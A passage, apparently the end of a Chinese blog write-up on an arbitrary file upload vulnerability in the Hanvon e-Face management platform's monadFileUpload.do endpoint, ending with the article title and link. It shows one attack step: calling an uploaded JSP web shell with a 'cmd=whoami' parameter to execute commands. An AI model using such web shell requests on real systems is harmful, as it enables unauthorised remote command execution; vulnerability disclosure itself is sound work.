...
访问文件执行命令
`/manage/resource/2025-xx-xx/xxxxx.jsp?cmd=whoami`

![汉王e脸通综合管理平台 monadFileUpload.do 任意文件上传漏洞](https://image.mrxn.net/d6d359b1ef9642aaa8dded509ab0ebfc.webp)
...
文章标题：
[汉王e脸通综合管理平台 monadFileUpload.do 任意文件上传漏洞](https://mrxn.net/jswz/hanvon-efacego-monadFileUpload-upload-rce.html)
  
文章链接：
<https://mrxn.net/jswz/hanvon-efacego-monadFileUpload-upload-rce.html>
